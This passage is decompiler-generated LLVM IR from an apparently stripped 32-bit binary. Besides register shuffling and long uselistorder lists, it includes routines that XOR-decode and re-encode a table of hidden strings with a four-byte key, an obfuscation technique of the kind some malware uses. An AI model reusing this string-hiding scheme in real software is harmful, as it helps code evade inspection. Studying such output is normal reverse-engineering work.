  %v2_8051b9c = inttoptr i32 %v1_8051b9c to i32*
  %v3_8051b9c = load i32, i32* %v2_8051b9c, align 4
  %v1_8051ba0 = add i32 %v3_8051b9c, 13
  store i32 %v1_8051ba0, i32* %eax.global-to-local, align 4
  %v2_8051ba3 = add i32 %v0_8051b95, -12
  %v3_8051ba3 = inttoptr i32 %v2_8051ba3 to i32*
  store i32 %v1_8051ba0, i32* %v3_8051ba3, align 4
  %v1_8051ba4 = add i32 %v0_8051b95, 48
  %v2_8051ba4 = inttoptr i32 %v1_8051ba4 to i32*
  %v3_8051ba4 = load i32, i32* %v2_8051ba4, align 4
  store i32 %v3_8051ba4, i32* %eax.global-to-local, align 4
  %v2_8051ba8 = add i32 %v0_8051b95, -16
  %v3_8051ba8 = inttoptr i32 %v2_8051ba8 to i32*
  store i32 %v3_8051ba4, i32* %v3_8051ba8, align 4
  %v0_8051ba9 = call i32 @function_80532c4()
  %v0_8051bae = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051bb3 = add i32 %v0_8051bae, 28
  %v2_8051bb3 = inttoptr i32 %v1_8051bb3 to i32*
  store i32 16384, i32* %v2_8051bb3, align 4
  %v1_8051bb8 = add i32 %v0_8051bae, 68
  %v2_8051bb8 = inttoptr i32 %v1_8051bb8 to i32*
  %v3_8051bb8 = load i32, i32* %v2_8051bb8, align 4
  store i32 %v3_8051bb8, i32* %ecx.global-to-local, align 4
  %v1_8051bbc = add i32 %v3_8051bb8, 13
  %v2_8051bbc = inttoptr i32 %v1_8051bbc to i8*
  %v3_8051bbc = load i8, i8* %v2_8051bbc, align 1
  %v4_8051bbc = zext i8 %v3_8051bbc to i32
  %v5_8051bbc = load i32, i32* %eax.global-to-local, align 4
  %v6_8051bbc = and i32 %v5_8051bbc, -256
  %v7_8051bbc = or i32 %v6_8051bbc, %v4_8051bbc
  store i32 %v7_8051bbc, i32* %eax.global-to-local, align 4
  %v2_8051bbf = add i32 %v0_8051bae, 24
  %v3_8051bbf = inttoptr i32 %v2_8051bbf to i32*
  store i32 %v7_8051bbc, i32* %v3_8051bbf, align 4
  %v0_8051bc0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051bc0 = add i32 %v0_8051bc0, 4
  %v2_8051bc0 = inttoptr i32 %v1_8051bc0 to i32*
  %v3_8051bc0 = load i32, i32* %v2_8051bc0, align 4
  store i32 %v3_8051bc0, i32* %eax.global-to-local, align 4
  %v2_8051bc3 = add i32 %v0_8051bae, 20
  %v3_8051bc3 = inttoptr i32 %v2_8051bc3 to i32*
  store i32 %v3_8051bc0, i32* %v3_8051bc3, align 4
  %v1_8051bc4 = add i32 %v0_8051bae, 64
  %v2_8051bc4 = inttoptr i32 %v1_8051bc4 to i32*
  %v3_8051bc4 = load i32, i32* %v2_8051bc4, align 4
  store i32 %v3_8051bc4, i32* %eax.global-to-local, align 4
  %v2_8051bc8 = add i32 %v0_8051bae, 16
  %v3_8051bc8 = inttoptr i32 %v2_8051bc8 to i32*
  store i32 %v3_8051bc4, i32* %v3_8051bc8, align 4
  %v0_8051bc9 = call i32 @function_80532c4()
  store i32 %v0_8051bc9, i32* %eax.global-to-local, align 4
  %v0_8051bce = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051af1

; uselistorder directives
  uselistorder i64 %v8_8051a8f, { 1, 0 }
  uselistorder i32 %v1_8051a82, { 1, 0 }
  uselistorder i32* %v2_8050c7e, { 1, 0 }
  uselistorder i32 %v2_805194b, { 1, 0 }
  uselistorder i32 %v3_8051948, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80518e4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80518e3, { 1, 0, 2 }
  uselistorder i16 %v1_80518ef, { 1, 0 }
  uselistorder i64 %v8_80518d0, { 1, 0 }
  uselistorder i32 %v3_8051863, { 1, 0 }
  uselistorder i32 %v0_8051863, { 1, 0 }
  uselistorder i32 %v0_805185b, { 1, 0 }
  uselistorder i32 %v1_8051768, { 1, 2, 0 }
  uselistorder i32 %v1_80516ef, { 1, 2, 0 }
  uselistorder i32 %v1_8051676, { 1, 2, 0 }
  uselistorder i32 %v1_80515fd, { 1, 2, 0 }
  uselistorder i32 %v0_80515b7, { 1, 0 }
  uselistorder i32 %v0_8051566, { 1, 0 }
  uselistorder i32 %v0_80519e7, { 1, 0 }
  uselistorder i32 %v7_80514b8, { 1, 0 }
  uselistorder i32 %v0_80514b8, { 1, 2, 0 }
  uselistorder i32 %v6_80514ab, { 1, 0 }
  uselistorder i32 %v0_80514ab, { 0, 2, 1 }
  uselistorder i32 %v6_805149e, { 1, 0 }
  uselistorder i32 %v2_805148a, { 1, 0, 2 }
  uselistorder i32 %v1_8051487, { 1, 0, 2 }
  uselistorder i32 %v0_8051484, { 1, 0 }
  uselistorder i32 %v0_8051480, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_8050ffd, { 1, 0 }
  uselistorder i32 %v0_8050ffd, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_8050ffd, { 0, 2, 1 }
  uselistorder i32 %v0_805107b128, { 1, 0 }
  uselistorder i32 %v1_8051400, { 2, 1, 0 }
  uselistorder i32 %v9_80513cf, { 1, 0 }
  uselistorder i32 %v0_8051676, { 0, 1, 3, 2 }
  uselistorder i32 %v9_805133c, { 1, 0 }
  uselistorder i32 %v1_8051335, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8051335, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_805130c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80512e6, { 1, 2, 0 }
  uselistorder i32 %v1_80512e6, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80512e1, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_80512b7, { 1, 0, 2 }
  uselistorder i32 %v0_805128b, { 0, 2, 1 }
  uselistorder i32 %v0_8051264, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %v1_80517eb, { 0, 2, 1 }
  uselistorder i32 %v0_805121b, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_80511f2, { 2, 1, 0 }
  uselistorder i32 %v9_80511c1, { 1, 0 }
  uselistorder i32 %v0_80515fd, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80511ad, { 2, 1, 0 }
  uselistorder i32 %v9_805117c, { 1, 0 }
  uselistorder i32 %v0_80516ef, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051152, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051142, { 2, 1, 0 }
  uselistorder i32 %v9_805111a, { 1, 0 }
  uselistorder i32 %v0_80515ab, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80510f5, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80510d7, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80510d2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80510c2, { 2, 1, 0 }
  uselistorder i32 %v9_8051091, { 1, 0 }
  uselistorder i32 %v0_805155a, { 0, 1, 3, 2 }
  uselistorder i32 %v2_805106f, { 1, 0 }
  uselistorder i32 %v0_805106f, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8051069, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051069, { 0, 2, 1 }
  uselistorder i32 %v0_8051064, { 1, 0 }
  uselistorder i32 %v0_805103f, { 1, 0, 2 }
  uselistorder i32 %v1_8051026, { 1, 0, 2 }
  uselistorder i32 %v1_805100a, { 1, 0, 2 }
  uselistorder i32 %v0_8051420, { 1, 0, 2 }
  uselistorder i32 %v0_805140b, { 3, 0, 1, 2 }
  uselistorder i32 %v0_805107b129, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8050ffd18, { 1, 0 }
  uselistorder i32 %v3_8050fe4, { 1, 0 }
  uselistorder i32 %v0_8050fe4, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_8050fcf, { 0, 2, 1 }
  uselistorder i32 %v0_8050fcb, { 1, 0 }
  uselistorder i32 %v0_8050fb2, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_8050fa8, { 1, 0 }
  uselistorder i32 %v1_8050f6f, { 2, 1, 0 }
  uselistorder i32 %v9_8050f3e, { 1, 0 }
  uselistorder i32 %v0_8051768, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050f2a, { 1, 0 }
  uselistorder i32 %v0_8050f2a, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050f09, { 1, 0 }
  uselistorder i32 %v2_8050f06, { 1, 0 }
  uselistorder i32 %v0_8050f04, { 1, 0 }
  uselistorder i32 %v0_8050ef1, { 2, 1, 0 }
  uselistorder i32 %v1_8050eee, { 1, 0 }
  uselistorder i32 %v2_8050eeb, { 1, 0 }
  uselistorder i32 %v3_8050edf, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_8050e8a, { 1, 0 }
  uselistorder i32 %v1_8050e6a, { 1, 0 }
  uselistorder i32 %v0_8050e6a, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8050e55, { 1, 0 }
  uselistorder i32 %v3_8050e52, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805193d, { 1, 0 }
  uselistorder i32 %v1_805193a, { 2, 1, 0 }
  uselistorder i32 %v3_8050e1a, { 1, 0, 2 }
  uselistorder i32 %v2_8050e18, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8050dbd, { 1, 0 }
  uselistorder i32 %v1_8050db2, { 1, 0 }
  uselistorder i32 %v0_8050db2, { 1, 0 }
  uselistorder i32 %v0_8050dbb, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8050d8f, { 1, 0 }
  uselistorder i32 %v0_8050d8f, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_8050d81, { 1, 0, 2 }
  uselistorder i32 %v4_8050d44, { 1, 2, 0 }
  uselistorder i32 %v3_8050d13, { 1, 0, 2 }
  uselistorder i32 %v0_8050c97, { 0, 2, 1 }
  uselistorder i32 %v0_8050c8e, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8050a5565, { 1, 0 }
  uselistorder i32 %v0_8050c71, { 2, 1, 0 }
  uselistorder i8 %v1_8050c43, { 1, 0 }
  uselistorder i8 %v2_8050c1d, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_8050c14, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_8050c12, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_8050c0c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8050c07, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050bbb, { 1, 0 }
  uselistorder i32 %v0_8050b0b, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8050b06, { 1, 0 }
  uselistorder i32 %v1_8050ae3, { 0, 2, 1 }
  uselistorder i32 %v0_8050a43, { 2, 0, 1 }
  uselistorder i32 %v0_8050a07, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 10, 34, 36, 29, 37, 19, 0, 17, 21, 22, 23, 25, 26, 27, 38, 39, 40, 30, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 18, 20, 24, 28, 31, 32, 33, 41, 42, 55, 54, 43, 35, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 14, 23, 24, 8, 0, 7, 9, 15, 1, 25, 6, 10, 11, 12, 13, 16, 26, 39, 40, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %eax.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 127, 57, 139, 140, 58, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 122, 123, 124, 59, 60, 61, 62, 63, 64, 156, 157, 158, 159, 160, 161, 90, 91, 92, 93, 94, 95, 96, 1, 2, 3, 4, 5, 6, 81, 82, 83, 84, 85, 86, 87, 99, 100, 101, 102, 103, 107, 108, 109, 110, 111, 112, 113, 114, 167, 168, 169, 170, 182, 134, 171, 172, 173, 174, 125, 135, 126, 128, 129, 130, 131, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 162, 163, 164, 165, 166, 66, 69, 67, 68, 70, 71, 72, 73, 74, 65, 75, 76, 77, 78, 79, 80, 88, 89, 97, 98, 104, 105, 106, 115, 116, 117, 118, 119, 120, 121, 132, 133, 136, 137, 138, 175, 176, 177, 178, 179, 180, 181, 183, 231, 232, 233, 229, 230, 0, 224, 225, 226, 227, 228, 184, 185, 186, 187, 188, 189, 190, 191, 192, 146, 193, 198, 194, 195, 196, 197, 199, 200, 201, 202, 203, 204, 205, 206, 55, 221, 223, 222, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220 }
  uselistorder i32 (i32)* @function_804fc90, { 1, 0 }
  uselistorder i32 ()* @function_80531f0, { 1, 0 }
  uselistorder i32 1864, { 1, 2, 0, 3 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1888, { 4, 0, 1, 2, 3 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 1, 0, 2 }
  uselistorder i32 ()* @function_8052baf, { 1, 0 }
  uselistorder i32 1872, { 0, 2, 1 }
  uselistorder i32 (i8)* @function_8051c10, { 2, 3, 8, 7, 0, 6, 1, 5, 4, 9, 10, 32, 33, 34, 35, 36, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32*)* @function_8051be0, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 49, 37, 38, 39, 40, 41, 55, 56, 57, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54 }
  uselistorder i32 1880, { 0, 1, 2, 3, 4, 5, 10, 8, 6, 9, 7 }
  uselistorder i32 (i8)* @function_8051c90, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 11, 12, 13, 14, 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 15, 16, 10, 17 }
  uselistorder i32 ()* @function_8052690, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 4, 3, 2, 13, 12, 11, 10, 9, 8, 1, 0, 7, 6, 5 }
  uselistorder i32 ()* @function_80532c4, { 21, 20, 19, 18, 17, 16, 15, 6, 5, 3, 2, 12, 11, 25, 24, 14, 13, 10, 9, 8, 7, 23, 22, 4, 1, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_805324e, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
  uselistorder i8 62, { 7, 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i8 58, { 7, 4, 5, 3, 6, 1, 0, 2, 8, 9 }
  uselistorder i32 (i32*)* @function_8052e42, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_8052d88, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 2, 0, 1 }
  uselistorder i32 ()* @function_8050190, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 3, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 ()* @function_8053281, { 1, 0 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 (i32)* @function_804fa00, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_8057296.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051b07, { 1, 0 }
  uselistorder label %dec_label_pc_80518fb, { 1, 0 }
  uselistorder label %dec_label_pc_80514e8, { 1, 0 }
  uselistorder label %dec_label_pc_8051413, { 8, 4, 0, 3, 5, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_8050ffd.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80513cf, { 1, 0 }
  uselistorder label %dec_label_pc_8051356, { 1, 0 }
  uselistorder label %dec_label_pc_8051326, { 1, 0 }
  uselistorder label %dec_label_pc_80512ec, { 1, 0 }
  uselistorder label %dec_label_pc_80512e1, { 3, 4, 10, 6, 1, 5, 7, 8, 0, 2, 11, 9 }
  uselistorder label %dec_label_pc_80511c1, { 1, 0 }
  uselistorder label %dec_label_pc_805117c, { 1, 0 }
  uselistorder label %dec_label_pc_8051145, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805111a, { 1, 0 }
  uselistorder label %dec_label_pc_80510c5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051091, { 1, 0 }
  uselistorder label %dec_label_pc_8051073, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8051052, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805103f, { 1, 0 }
  uselistorder label %dec_label_pc_805102d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051001, { 1, 0 }
  uselistorder label %dec_label_pc_8051001.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050fd4, { 1, 0 }
  uselistorder label %dec_label_pc_8050fcf, { 1, 0 }
  uselistorder label %dec_label_pc_8050f8d, { 1, 0 }
  uselistorder label %dec_label_pc_8050f79, { 1, 0 }
  uselistorder label %dec_label_pc_8050f72.loopexit12.loopexit, { 13, 11, 4, 9, 0, 5, 6, 7, 8, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_8050f72.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_8050f3e, { 1, 0 }
  uselistorder label %dec_label_pc_8050f1b, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8050f04, { 1, 0 }
  uselistorder label %dec_label_pc_8050eac, { 1, 0 }
  uselistorder label %dec_label_pc_8050e5b, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_8050e26, { 1, 0 }
  uselistorder label %dec_label_pc_8050de0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050db2, { 1, 0 }
  uselistorder label %dec_label_pc_8050ccb, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_8050cc0, { 1, 0 }
  uselistorder label %dec_label_pc_8050c85, { 1, 0 }
  uselistorder label %dec_label_pc_8050c51, { 1, 0 }
  uselistorder label %dec_label_pc_8050c07.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_8050a55, { 1, 2, 4, 0, 3 }
}

define i32 @function_8051be0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8051be0:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_8051be8 = icmp eq i32* %arg2, null
  %v1_8051bea = mul i32 %arg1, 8
  store i32 %v1_8051bea, i32* @edx, align 4
  br i1 %v1_8051be8, label %dec_label_pc_8051c03, label %dec_label_pc_8051bf9

dec_label_pc_8051bf9:                             ; preds = %dec_label_pc_8051be0
  %v1_8051bf9 = add i32 %v1_8051bea, add (i32 ptrtoint (i32* @global_var_8057320.52 to i32), i32 4)
  %v2_8051bf9 = inttoptr i32 %v1_8051bf9 to i32*
  %v3_8051bf9 = load i32, i32* %v2_8051bf9, align 4
  %v1_8051bfc = urem i32 %v3_8051bf9, 65536
  store i32 %v1_8051bfc, i32* %arg2, align 4
  %v0_8051c03.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051c03

dec_label_pc_8051c03:                             ; preds = %dec_label_pc_8051be0, %dec_label_pc_8051bf9
  %v0_8051c03 = phi i32 [ %v1_8051bea, %dec_label_pc_8051be0 ], [ %v0_8051c03.pre, %dec_label_pc_8051bf9 ]
  %v1_8051c03 = add i32 %v0_8051c03, ptrtoint (i32* @global_var_8057320.52 to i32)
  %v2_8051c03 = inttoptr i32 %v1_8051c03 to i32*
  %v3_8051c03 = load i32, i32* %v2_8051c03, align 4
  ret i32 %v3_8051c03

; uselistorder directives
  uselistorder label %dec_label_pc_8051c03, { 1, 0 }
}

define i32 @function_8051c10(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051c10:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051c19 = zext i8 %arg1 to i32
  %v1_8051c1d = mul nuw nsw i32 %v4_8051c19, 8
  %v2_8051c1d = add i32 %v1_8051c1d, ptrtoint (i32* @global_var_8057320.52 to i32)
  store i32 %v2_8051c1d, i32* @ecx, align 4
  %v0_8051c24 = load i16, i16* @global_var_805719c.53, align 2
  %v1_8051c24 = sext i16 %v0_8051c24 to i32
  %v1_8051c29 = add i32 %v1_8051c1d, add (i32 ptrtoint (i32* @global_var_8057320.52 to i32), i32 4)
  %v2_8051c29 = inttoptr i32 %v1_8051c29 to i16*
  %v3_8051c29 = load i16, i16* %v2_8051c29, align 4
  %v4_8051c29 = icmp eq i16 %v3_8051c29, 0
  br i1 %v4_8051c29, label %dec_label_pc_8051c7a, label %dec_label_pc_8051c30

dec_label_pc_8051c30:                             ; preds = %dec_label_pc_8051c10
  store i32 %v1_8051c24, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_8051c38 = udiv i32 %v1_8051c24, 16777216
  %v2_8051c3b = udiv i32 %v1_8051c24, 256
  store i32 %v2_8051c3b, i32* %edi.global-to-local, align 4
  %v5_8051c3e = trunc i32 %v2_8051c38 to i8
  store i8 %v5_8051c3e, i8* %stack_var_-44, align 1
  %v2_8051c41 = udiv i32 %v1_8051c24, 65536
  store i32 %v2_8051c41, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c44

dec_label_pc_8051c44:                             ; preds = %dec_label_pc_8051c44.dec_label_pc_8051c44_crit_edge, %dec_label_pc_8051c30
  %v0_8051c4a = phi i32 [ %v0_8051c4a.pre, %dec_label_pc_8051c44.dec_label_pc_8051c44_crit_edge ], [ %v1_8051c24, %dec_label_pc_8051c30 ]
  %v0_8051c46 = phi i32 [ %v1_8051c76, %dec_label_pc_8051c44.dec_label_pc_8051c44_crit_edge ], [ 0, %dec_label_pc_8051c30 ]
  %v0_8051c44 = phi i32 [ %v0_8051c6e, %dec_label_pc_8051c44.dec_label_pc_8051c44_crit_edge ], [ %v2_8051c1d, %dec_label_pc_8051c30 ]
  %v1_8051c44 = inttoptr i32 %v0_8051c44 to i32*
  %v2_8051c44 = load i32, i32* %v1_8051c44, align 4
  %v2_8051c48 = add i32 %v2_8051c44, %v0_8051c46
  %v1_8051c4c = inttoptr i32 %v2_8051c48 to i8*
  %v2_8051c4c = load i8, i8* %v1_8051c4c, align 1
  %v4_8051c4c = trunc i32 %v0_8051c4a to i8
  %v5_8051c4c = xor i8 %v2_8051c4c, %v4_8051c4c
  store i8 %v5_8051c4c, i8* %v1_8051c4c, align 1
  %v0_8051c4e = load i32, i32* @edx, align 4
  %v0_8051c50 = load i32, i32* @ecx, align 4
  %v1_8051c50 = inttoptr i32 %v0_8051c50 to i32*
  %v2_8051c50 = load i32, i32* %v1_8051c50, align 4
  %v2_8051c52 = add i32 %v2_8051c50, %v0_8051c4e
  %v0_8051c54 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c56 = inttoptr i32 %v2_8051c52 to i8*
  %v2_8051c56 = load i8, i8* %v1_8051c56, align 1
  %v4_8051c56 = trunc i32 %v0_8051c54 to i8
  %v5_8051c56 = xor i8 %v2_8051c56, %v4_8051c56
  store i8 %v5_8051c56, i8* %v1_8051c56, align 1
  %v0_8051c58 = load i32, i32* @edx, align 4
  %v0_8051c5a = load i32, i32* @ecx, align 4
  %v1_8051c5a = inttoptr i32 %v0_8051c5a to i32*
  %v2_8051c5a = load i32, i32* %v1_8051c5a, align 4
  %v2_8051c5c = add i32 %v2_8051c5a, %v0_8051c58
  %v0_8051c5e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051c60 = inttoptr i32 %v2_8051c5c to i8*
  %v2_8051c60 = load i8, i8* %v1_8051c60, align 1
  %v4_8051c60 = trunc i32 %v0_8051c5e to i8
  %v5_8051c60 = xor i8 %v2_8051c60, %v4_8051c60
  store i8 %v5_8051c60, i8* %v1_8051c60, align 1
  %v0_8051c62 = load i32, i32* @edx, align 4
  %v0_8051c64 = load i32, i32* @ecx, align 4
  %v1_8051c64 = inttoptr i32 %v0_8051c64 to i32*
  %v2_8051c64 = load i32, i32* %v1_8051c64, align 4
  %v1_8051c66 = add i32 %v0_8051c62, 1
  store i32 %v1_8051c66, i32* @edx, align 4
  %v2_8051c67 = add i32 %v2_8051c64, %v0_8051c62
  %v2_8051c69 = load i8, i8* %stack_var_-44, align 1
  %v1_8051c6c = inttoptr i32 %v2_8051c67 to i8*
  %v2_8051c6c = load i8, i8* %v1_8051c6c, align 1
  %v5_8051c6c = xor i8 %v2_8051c6c, %v2_8051c69
  store i8 %v5_8051c6c, i8* %v1_8051c6c, align 1
  %v0_8051c6e = load i32, i32* @ecx, align 4
  %v1_8051c6e = add i32 %v0_8051c6e, 4
  %v2_8051c6e = inttoptr i32 %v1_8051c6e to i32*
  %v3_8051c6e = load i32, i32* %v2_8051c6e, align 4
  %v1_8051c71 = urem i32 %v3_8051c6e, 65536
  %v1_8051c76 = load i32, i32* @edx, align 4
  %v8_8051c78 = icmp sgt i32 %v1_8051c71, %v1_8051c76
  br i1 %v8_8051c78, label %dec_label_pc_8051c44.dec_label_pc_8051c44_crit_edge, label %dec_label_pc_8051c7a.loopexit

dec_label_pc_8051c44.dec_label_pc_8051c44_crit_edge: ; preds = %dec_label_pc_8051c44
  %v0_8051c4a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051c44

dec_label_pc_8051c7a.loopexit:                    ; preds = %dec_label_pc_8051c44
  br label %dec_label_pc_8051c7a

dec_label_pc_8051c7a:                             ; preds = %dec_label_pc_8051c7a.loopexit, %dec_label_pc_8051c10
  %v0_8051c81 = phi i32 [ %v1_8051c71, %dec_label_pc_8051c7a.loopexit ], [ %v1_8051c24, %dec_label_pc_8051c10 ]
  ret i32 %v0_8051c81

; uselistorder directives
  uselistorder i32 %v1_8051c76, { 1, 0 }
  uselistorder i32 %v1_8051c71, { 1, 0 }
  uselistorder i32 %v0_8051c6e, { 1, 0 }
  uselistorder i32 %v1_8051c24, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_8051c90(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051c90:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051c99 = zext i8 %arg1 to i32
  %v1_8051c9d = mul nuw nsw i32 %v4_8051c99, 8
  %v2_8051c9d = add i32 %v1_8051c9d, ptrtoint (i32* @global_var_8057320.52 to i32)
  store i32 %v2_8051c9d, i32* %ecx.global-to-local, align 4
  %v0_8051ca4 = load i16, i16* @global_var_805719c.53, align 2
  %v1_8051ca4 = sext i16 %v0_8051ca4 to i32
  %v1_8051ca9 = add i32 %v1_8051c9d, add (i32 ptrtoint (i32* @global_var_8057320.52 to i32), i32 4)
  %v2_8051ca9 = inttoptr i32 %v1_8051ca9 to i16*
  %v3_8051ca9 = load i16, i16* %v2_8051ca9, align 4
  %v4_8051ca9 = icmp eq i16 %v3_8051ca9, 0
  br i1 %v4_8051ca9, label %dec_label_pc_8051cfa, label %dec_label_pc_8051cb0

dec_label_pc_8051cb0:                             ; preds = %dec_label_pc_8051c90
  store i32 %v1_8051ca4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8051cb8 = udiv i32 %v1_8051ca4, 16777216
  %v2_8051cbb = udiv i32 %v1_8051ca4, 256
  store i32 %v2_8051cbb, i32* %edi.global-to-local, align 4
